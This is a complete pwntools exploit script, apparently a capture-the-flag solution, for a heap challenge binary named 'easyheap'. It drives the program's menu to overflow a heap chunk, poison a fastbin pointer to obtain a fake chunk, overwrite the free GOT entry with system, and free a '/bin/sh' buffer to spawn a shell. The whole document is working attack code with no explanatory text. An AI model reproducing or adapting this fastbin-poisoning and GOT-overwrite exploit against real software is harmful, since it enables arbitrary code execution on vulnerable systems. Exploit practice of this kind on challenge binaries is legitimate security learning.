from pwn import *

p = process("./easyheap")
elf = ELF("./easyheap")

def create(size, content):
    p.sendlineafter('choice :', str(1))
    p.sendlineafter('Heap :', str(size))
    p.sendafter('heap:', content)

def edit(idx, size, content):
    p.sendlineafter('choice :', str(2))
    p.sendlineafter('Index :', str(idx))
    p.sendlineafter('Heap :', str(size))
    p.sendafter('heap :', content)
    
def delete(idx):
    p.sendlineafter('choice :', str(3))
    p.sendlineafter('Index :', str(idx))

create(0x68, b'woaini') # 0
create(0x68, b'a') # 1
create(0x68, b'a') # 2
delete(2)
edit(1, 0x78, b'/bin/sh'.ljust(0x68, b'\x00') + p64(0x71) + p64(0x6020ad))
create(0x68, b'b') # 2
create(0x68, b'b') # 3 fake_chunk
edit(3, 0x2b, b'c' * 0x23 + p64(elf.got['free']))
edit(0, 0x8, p64(elf.plt['system']))
delete(1)

p.interactive()